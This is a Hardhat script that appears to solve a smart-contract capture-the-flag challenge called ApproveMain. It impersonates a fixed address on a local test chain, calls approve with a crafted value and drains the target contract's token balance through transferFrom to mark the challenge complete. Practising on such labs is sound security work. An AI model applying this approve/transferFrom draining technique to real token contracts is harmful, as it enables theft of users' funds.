const { ethers } = require("hardhat");

async function deploy(deployer) {
  const ApproveMain = await ethers.getContractFactory("ApproveMain", deployer);
  const approveMain = await ApproveMain.deploy();
  console.log("ApproveMain contract:", approveMain.address);

  return approveMain;
}

async function exploit(target) {
  let aim = "beddC4".toLowerCase();
  // while ((attack = ethers.Wallet.createRandom())) {
  //     if (attack.address.substr(36, 6).toLowerCase() == aim) {
  //         break;
  //     }
  // }

  let attacker = await ethers.getImpersonatedSigner(
    "0x5B38Da6a701c568545dCfcB03FcB875f56beddC4"
  );
  await ethers.provider.send("hardhat_setBalance", [
    attacker.address,
    "0xde0b6b3a7640000",
  ]);
  console.log("attacker address:", attacker.address);

  console.log("Before: Complete():", await target.isComplete());
  const Cert = await ethers.getContractFactory(
    "contracts/challenge10/ApproveMain.sol:Cert"
  );

  const cert = Cert.attach(await target.cert());
  const ApproveMainSolution = await ethers.getContractFactory(
    "ApproveMainSolution"
  );
  const approveMainSolution = await ApproveMainSolution.deploy();
  const spender = await approveMainSolution.deploy();

  await cert
    .connect(attacker)
    .approve(
      spender,
      "0x0f71bde851f8fc7850a5f7baab5848959c77c7f4406f4ad8ce9fcea6fd03f271"
    );
  await cert
    .connect(attacker)
    .transferFrom(
      target.address,
      attacker.address,
      await cert.balanceOf(target.address)
    );
  await target.Complete();

  console.log("After: Complete():", await target.isComplete());
}

async function main() {
  let [deployer] = await ethers.getSigners();
  let approveMain = await deploy(deployer);

  await exploit(approveMain);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
